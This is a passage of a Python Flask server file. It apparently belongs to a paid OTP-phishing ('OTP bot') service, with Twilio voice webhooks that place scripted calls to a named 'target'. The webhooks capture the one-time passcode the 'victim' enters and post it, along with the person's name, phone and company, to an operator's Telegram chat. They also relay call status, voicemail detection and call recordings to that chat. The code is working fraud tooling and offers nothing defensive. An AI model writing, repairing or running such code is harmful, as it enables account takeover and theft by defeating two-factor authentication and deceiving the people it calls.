        if user and user.get('premium') and user.get('premium_expiry'):
            expiry = user['premium_expiry']
            if hasattr(expiry, 'tzinfo') and expiry.tzinfo:
                expiry = expiry.replace(tzinfo=None)
            if expiry > now:
                return _cors(jsonify({
                    'valid': True,
                    'key': key,
                    'days': days,
                    'expires_at': expiry.isoformat() + 'Z',
                    'tier': 'PREMIUM',
                    'username': user.get('username') or '',
                    'message': 'Premium active'
                }))

    return _cors(jsonify({
        'valid': False,
        'error': 'Key already redeemed and premium expired',
        'redeemed_at': used_at.isoformat() if used_at else None
    }))


def _twiml_error_response(msg="We are sorry, please try again later."):
    """Return a valid TwiML 200 response instead of a 500 for Twilio webhooks."""
    from twilio.twiml.voice_response import VoiceResponse
    r = VoiceResponse()
    r.say(msg, voice="alice", language="en-US")
    r.pause(length=1)
    r.hangup()
    return str(r), 200, {'Content-Type': 'text/xml'}


@app.route('/voice/otp', methods=['GET', 'POST'])
def voice_otp():
    try:
        from modules.twilio_call import get_pending_call, build_voice_twiml_main, get_webhook_base
        token = request.args.get('token', '')
        caller = request.values.get('From', 'unknown')
        sid    = request.values.get('CallSid', 'unknown')
        print(f"[VOICE/OTP] Request received — token={token} From={caller} CallSid={sid} method={request.method}")
        data  = get_pending_call(token) or {}
        print(f"[VOICE/OTP] Call data found: {bool(data)} keys={list(data.keys())}")
        base  = get_webhook_base()
        name   = data.get("name", "")
        company= data.get("company", "")
        lang   = data.get("lang", "en")
        script = data.get("custom_script", "")
        print(f"[VOICE/OTP] name={name!r} company={company!r} lang={lang!r} script={script[:40]!r}")
        twiml = build_voice_twiml_main(token, base, data)
        print(f"[VOICE/OTP] Returning TwiML length={len(twiml)}")
        print(f"[VOICE/OTP] TwiML content: {twiml}")
        return twiml, 200, {'Content-Type': 'text/xml'}
    except Exception as e:
        import traceback
        print(f"[VOICE/OTP ERROR] {e}\n{traceback.format_exc()}")
        return _twiml_error_response("Hello, please hold while we connect your call.")


@app.route('/voice/gather', methods=['GET', 'POST'])
def voice_gather():
    import requests as _req
    try:
        from modules.twilio_call import get_pending_call, build_voice_twiml_gather, get_webhook_base
        token = request.args.get('token', '')
        data  = get_pending_call(token) or {}
        digit = request.values.get('Digits', '')
        base  = get_webhook_base()

        # Notify operator immediately when target presses 1
        if digit == '1':
            chat_id = data.get('chat_id', '')
            if chat_id:
                try:
                    BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
                    if BOT_TOKEN:
                        name    = data.get('name', 'N/A')
                        phone   = data.get('phone', 'N/A')
                        company = data.get('company', 'N/A')
                        _req.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": (
                                    f"☎️ <b>Target Pressed 1!</b>\n\n"
                                    f"📞 Phone: <code>{phone}</code>\n"
                                    f"👤 Name: {name}\n"
                                    f"🏢 Company: {company}\n\n"
                                    f"⌨️ <i>Victim is now entering the OTP...</i>"
                                ),
                                "parse_mode": "HTML",
                            },
                            timeout=10,
                        )
                except Exception as e:
                    print(f"[VOICE] Error sending pressed-1 alert: {e}")

        twiml = build_voice_twiml_gather(token, base, data, digit)
        return twiml, 200, {'Content-Type': 'text/xml'}
    except Exception as e:
        print(f"[VOICE/GATHER ERROR] {e}")
        return _twiml_error_response("We are processing your request. Please wait.")


@app.route('/voice/gatherotp', methods=['GET', 'POST'])
def voice_gatherotp():
    import requests as _req
    try:
        from modules.twilio_call import get_pending_call, build_voice_twiml_otp_captured, clear_call_data
        token   = request.args.get('token', '')
        data    = get_pending_call(token) or {}
        otp     = request.values.get('Digits', '')
        lang    = data.get('lang', 'en')
        chat_id = data.get('chat_id', '')

        if otp and chat_id:
            try:
                BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
                if BOT_TOKEN:
                    msg = (
                        f"🔐 <b>OTP Captured!</b>\n\n"
                        f"📞 Phone: <code>{data.get('phone', 'N/A')}</code>\n"
                        f"👤 Name: {data.get('name', 'N/A')}\n"
                        f"🏢 Company: {data.get('company', 'N/A')}\n"
                        f"🔑 OTP: <b><code>{otp}</code></b>\n\n"
                        f"Use the buttons below to mark this OTP:"
                    )
                    keyboard = {
                        "inline_keyboard": [[
                            {"text": "✅ Accept OTP", "callback_data": f"otp_accept_{otp}"},
                            {"text": "❌ Decline OTP", "callback_data": f"otp_decline_{otp}"},
                        ]]
                    }
                    _req.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": chat_id,
                            "text": msg,
                            "parse_mode": "HTML",
                            "reply_markup": keyboard,
                        },
                        timeout=10,
                    )
            except Exception as e:
                print(f"[VOICE] Error sending OTP to Telegram: {e}")

        twiml = build_voice_twiml_otp_captured(otp, lang)
        return twiml, 200, {'Content-Type': 'text/xml'}
    except Exception as e:
        print(f"[VOICE/GATHEROTP ERROR] {e}")
        return _twiml_error_response("Thank you. Your information has been received. Goodbye.")


@app.route('/voice/status', methods=['GET', 'POST'])
def voice_status():
    import requests as _req
    from modules.twilio_call import get_pending_call, get_call_data
    token = request.args.get('token', '')
    data = get_pending_call(token)
    if not data:
        call_sid = request.values.get('CallSid', '')
        data = get_call_data(call_sid)

    call_status = request.values.get('CallStatus', '')
    chat_id = data.get('chat_id', '')

    status_map = {
        'initiated':  '📡 Call initiated...',
        'ringing':    '🔔 Phone is ringing...',
        'answered':   '✅ Call answered!',
        'completed':  '📴 Call completed.',
        'busy':       '🔴 Line busy.',
        'no-answer':  '⚠️ No answer.',
        'canceled':   '❌ Call canceled.',
        'failed':     '❌ Call failed.',
    }

    msg = status_map.get(call_status)
    if msg and chat_id:
        try:
            BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
            if BOT_TOKEN:
                _req.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": chat_id, "text": msg},
                    timeout=10,
                )
        except Exception as e:
            print(f"[VOICE] Error sending status: {e}")

    return '', 204


@app.route('/voice/amd', methods=['GET', 'POST'])
def voice_amd():
    import requests as _req
    from modules.twilio_call import get_pending_call, build_voice_twiml_voicemail
    token = request.args.get('token', '')
    data = get_pending_call(token)
    answered_by = request.values.get('AnsweredBy', '')
    chat_id = data.get('chat_id', '')
    lang = data.get('lang', 'en')

    if answered_by and answered_by.startswith('machine'):
        if chat_id:
            try:
                BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
                if BOT_TOKEN:
                    _req.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": "📬 Call went to voicemail."},
                        timeout=10,
                    )
            except Exception:
                pass

    return '', 204


@app.route('/voice/recording', methods=['GET', 'POST'])
def voice_recording():
    """
    Twilio calls this webhook when a call recording is ready.
    We download the MP3 and forward it as a playable audio message in Telegram.
    """
    import requests as _req
    from modules.twilio_call import get_pending_call, get_call_data, TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN
    token = request.args.get('token', '')
    data = get_pending_call(token)
    if not data:
        call_sid = request.values.get('CallSid', '')
        data = get_call_data(call_sid)

    recording_status = request.values.get('RecordingStatus', '')
    recording_url    = request.values.get('RecordingUrl', '')
    chat_id          = data.get('chat_id', '')

    if recording_status == 'completed' and recording_url and chat_id:
        try:
            BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
            if BOT_TOKEN and TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN:
                # Download the recording MP3 from Twilio (requires basic auth)
                mp3_url = recording_url if recording_url.endswith('.mp3') else recording_url + '.mp3'
                audio_resp = _req.get(
                    mp3_url,
                    auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
                    timeout=30,
                )
                if audio_resp.status_code == 200:
                    name    = data.get('name', 'N/A')
                    company = data.get('company', 'N/A')
                    phone   = data.get('phone', 'N/A')
                    caption = (
                        f"🎙 <b>Call Recording</b>\n\n"
                        f"📞 {phone}\n"
                        f"👤 {name}  |  🏢 {company}"
                    )
                    _req.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
                        data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
                        files={"audio": ("call_recording.mp3", audio_resp.content, "audio/mpeg")},
                        timeout=60,
                    )
                else:
                    print(f"[VOICE] Recording download failed: HTTP {audio_resp.status_code}")
        except Exception as e:
            print(f"[VOICE] Error sending recording to Telegram: {e}")

    return '', 204


def run():
    try:
        from waitress import serve
        serve(app, host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), threads=16, channel_timeout=60, connection_limit=500)
    except ImportError:
        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), threaded=True)

def keep_alive():
    t = Thread(target=run)
    t.start()
